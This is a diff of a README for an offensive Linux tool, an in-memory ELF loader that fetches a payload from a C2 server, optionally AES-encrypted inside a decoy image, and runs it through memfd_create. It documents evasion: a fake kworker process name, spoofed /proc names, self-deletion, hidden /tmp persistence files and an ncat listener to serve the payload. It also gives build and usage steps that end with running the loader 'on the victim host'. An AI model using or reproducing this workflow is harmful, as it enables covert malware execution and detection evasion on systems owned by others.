@@ -1,70 +1,133 @@
+## In-Memory Loader for Linux
 
-## Fileless In-Memory Loader Linux 
+This tool implements an **in-memory ELF loader** for Linux systems. It connects to a remote C2 (Command & Control) server over TCP, downloads a ELF payload (optionally encrypted and embedded in a decoy image), and executes it directly from memory using `memfd_create()`.
 
-This tool implements a fileless, in-memory ELF loader for Linux systems. It connects to a remote C2 (Command & Control) server over TCP, downloads a raw ELF payload, and executes it entirely from memory using memfd_create().
+> ⚠️ **For educational and authorized use only.**
+> Do not use this tool on systems you do not own or lack explicit permission to operate on.
 
-> ⚠️ **For educational and authorized use only.** Do not use on systems you do not own or have explicit permission to operate on.
 
 ### Key Features
- * Uses memfd_create() to create a memory-backed, executable file descriptor
- * Pulls payload from a configurable C2 IP and port over a socket connection
- * Executes the ELF binary directly from memory via /proc/self/fd/<fd>
- * Applies a fake process name (argv[0]) for stealth in `ps`, `top`, etc.
- * Deletes itself from disk (via unlink("/proc/self/exe")) after execution
- * Leaves no payload or loader trace on the filesystem after startup
 
-### Configuration
+* Pulls a payload from a remote C2 or local image file
+* Optional AES-256-CBC encryption with a custom marker
+* Uses `memfd_create()` to execute from memory with no filesystem drop
+* Fake process name via `argv[0]` to evade process listings
+* Temporary symlink spoofing to set custom `/proc/<pid>/status` names
+* Deletes itself via `unlink("/proc/self/exe")` after startup
+* Optional persistence by writing the payload+image to disk
 
-Inside `loader.c`, you can configure the following parameters:
+### Configuration & Build
 
-```c
-const char *C2_IP        = "127.0.0.1";              // C2 IP
-const int   C2_PORT      = 1111;                     // C2 port
-const char *FAKE_PROC    = "[kworker/0:1-events]";   // Shown in `ps` output
-const char *FD_NAME      = "error";                  // Shown in `cat /proc/<pid>/maps` as `[memfd:error (deleted)]`
-const char *PROC_LINK    = "";                       // Detault empty. Shown in `cat /proc/<pid>/status` as `Name: <filename>`.
-````
+You define all parameters in a `config.json` file. The Python builder script (`builder.py`) handles:
 
-You can choose between two execution workflows:
-1. **In-Memory Only (default)**: If `PROC_LINK` is left empty, the payload is injected and executed entirely from memory using `memfd_create()`. While this leaves no trace on disk, a side effect is that the process name shown in `/proc/<pid>/status` appears as a numeric string (e.g., `Name: <fd>`).
-2. **Temporary Symlink Execution**: If `PROC_LINK` is set, a short-lived symbolic link (\~1 second) is created pointing to the memory file descriptor (e.g., `/proc/self/fd/<fd>`). The payload is then executed via this symlink. This allows you to define a custom process name—ideally mimicking legitimate system processes like `kworker` or `rcu_sched`—to improve stealth. After execution, the symlink is unlinked to avoid leaving artifacts on disk. 
+* Payload encryption and embedding
+* Loader patching with C constants
+* Marker injection and key generation
+
+#### Example `config.json`:
+
+```json
+{
+  "image": "input.png",
+  "binary": "payload.elf",
+  "password": "supersecret",
+  "output": "out.png",
+  "loader": "loader.c",
+  "patched": "loader_patched.c",
+  "C2_IP": "192.168.1.10",
+  "C2_PORT": 4444,
+  "FAKE_PROC": "[kworker/0:1-events]",
+  "FD_NAME": "error",
+  "PROC_LINK": "/tmp/.cache-update",
+  "EXTRACT_PATH": "/tmp/.hidden.png",
+  "marker": "ENCRYPTED_PAYLOAD"
+}
+```
+
+#### Build it:
+
+```bash
+python3 builder.py --config config.json
+```
+
+### Payload Input Modes
+
+The payload can be retrieved and decrypted in **two ways**:
+
+1. **Remote Plain ELF**
+   The payload is served directly over the socket (no encryption).
+
+2. **Remote or Local Encrypted Image**
+   The encrypted payload is embedded into an image file and appended after a marker. The loader will:
+
+   * Check for `EXTRACT_PATH` and load it if available
+   * Otherwise, connect to the C2 to download it
+   * Decrypt it using the marker and AES key
+
+### Execution Modes
+
+The loader supports **three execution modes**, based on configuration:
+
+#### 1. In-Memory Only (Default)
+
+If `PROC_LINK` is **empty**:
+
+* Payload is loaded into memory using `memfd_create()`
+* Executed via `fexecve()`
+* No disk artifacts remain
+* `/proc/<pid>/status` will show a numeric name (e.g., `Name: 5`)
+
+#### 2. Temporary Symlink Execution
+
+If `PROC_LINK` is **set**:
+
+* A symlink is created to `/proc/self/fd/<fd>` (e.g. `/tmp/.cache`)
+* The process is executed through the symlink to spoof its name
+* The symlink is deleted automatically after a short delay (\~1s)
+* This provides stealthier `/proc/<pid>/status` entries
+
+#### 3. Persistence via Local Extraction
+
+If `EXTRACT_PATH` is **set**:
+
+* The encrypted image is stored on disk
+* On subsequent runs, the loader will use this instead of redownloading
+* Useful in restricted environments where remote access is limited
 
 ### Usage
 
-1. Compile the Loader
+1. **Generate the loader and image**:
 
 ```bash
-gcc -o loader loader.c
-gcc -o payload.elf test-payload.c
+python builder.py --config config.json
 ```
 
-2. Start the C2 (e.g., Netcat)
+2. **Compile payload**:
 
 ```bash
-ncat -lvnp 1111 < payload.elf
+gcc -o loader loader_build.c -lcrypto
 ```
 
-3. Run the Loader
+3. **Serve the payload (if no EXTRACT\_PATH)**:
+
+```bash
+ncat -lvnp 4444 < encrypted.png
+```
+
+4. **Execute the loader on the victim host**:
 
 ```bash
 ./loader
 ```
 
-If successful:
-
-* The loader deletes itself
-* The payload executes in memory
-* The process appears with the fake name (`[kworker/u!0]`)
-* Nothing is left on disk
-
-## Forensics traces
+### Forensics Traces
 
 ```bash
 $ ps aux | grep kworker
-root      1233  0.0  0.0   2196  1200 ?        Ss   13:47   0:00 [kworker/0:1-events]
-root      1235  0.0  0.0   3040  1428 pts/2    S+   13:47   0:00 grep kworker
-$ cat /proc/1233/maps | grep memfd
-00400000-00401000 r-xp 00000000 00:01 1025                               /memfd:error (deleted)
-0041f000-00420000 r--p 0000f000 00:01 1025                               /memfd:error (deleted)
-00420000-00421000 rw-p 00010000 00:01 1025                               /memfd:error (deleted)
+root     1023  0.0  0.0   2344   500 ?        Ss   14:01   0:00 [kworker/0:1-events]
+root     1025  0.0  0.0   3040  1428 pts/0    S+   14:01   0:00 grep kworker
+
+$ cat /proc/1023/maps | grep memfd
+00400000-00401000 r-xp 00000000 00:01 1234      /memfd:error (deleted)
+0041f000-00420000 r--p 0000f000 00:01 1234      /memfd:error (deleted)
 ```
